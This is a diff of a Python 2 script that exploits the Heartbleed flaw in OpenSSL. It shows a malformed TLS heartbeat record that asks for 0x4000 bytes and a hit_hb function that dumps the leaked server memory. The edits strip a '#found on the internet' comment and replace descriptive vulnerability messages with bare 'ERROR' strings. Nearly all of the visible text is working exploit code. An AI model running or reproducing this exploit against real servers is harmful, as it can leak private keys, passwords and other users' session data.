@@ -24,8 +24,7 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
 00 0f 00 01 01                                  
-''')
-#found on the internet 
+''') 
 hb = h2bin(''' 
 18 03 02 00 03
 01 40 00
@@ -56,27 +55,25 @@ def hit_hb(sock):
         hdr = sock.recv(5)
         tipo,versao,tam = struct.unpack('>BHH', hdr)
         if hdr is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            print 'ERROR'
             return False
 
         if tipo is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            print 'ERROR'
             return False
 
         pay = recvall(sock, tam)
         if pay is None:
-            print 'Unexpected EOF receiving record payload - server closed connection'
+            print 'ERROR'
             return False
 
         if tipo == 24:
-            print 'Received heartbeat response:'
             hexdump(pay)
             return True
 
         if tipo == 21:
-            print 'Received alert:'
             hexdump(pay)
-            print 'Server returned error, likely not vulnerable'
+            print 'Server returned error'
             return False
 
 def main():
